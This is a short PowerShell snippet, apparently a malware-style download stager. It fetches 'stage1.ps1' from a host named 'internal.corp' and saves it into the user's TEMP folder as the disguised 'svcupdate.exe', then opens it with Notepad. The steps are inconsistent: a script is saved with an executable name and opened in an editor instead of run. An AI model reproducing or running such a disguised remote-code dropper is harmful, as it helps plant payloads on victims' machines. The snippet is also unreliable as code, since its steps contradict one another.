
$DownloadUrl = "http://internal.corp/stage1.ps1"
$DropPath = "$env:TEMP\svcupdate.exe"
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $DropPath)
Start-Process -FilePath "notepad.exe" -ArgumentList $DropPath
Set-Location -Path $env:TEMP
